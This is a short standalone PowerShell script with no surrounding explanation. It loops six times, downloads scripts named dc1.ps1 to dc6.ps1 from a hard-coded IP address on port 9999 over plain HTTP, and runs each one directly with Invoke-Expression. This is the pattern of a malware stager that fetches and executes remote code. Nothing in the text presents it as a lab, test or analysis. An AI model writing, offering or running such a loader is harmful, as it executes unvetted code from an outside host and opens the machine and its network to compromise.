
for ($i = 1; $i -le 6; $i++) {
   
    $url = "http://103.67.197.187:9999/dc$i.ps1"
    
    
    $webClient = New-Object System.Net.WebClient
    $scriptContent = $webClient.DownloadString($url)
    
    
    Invoke-Expression $scriptContent
}
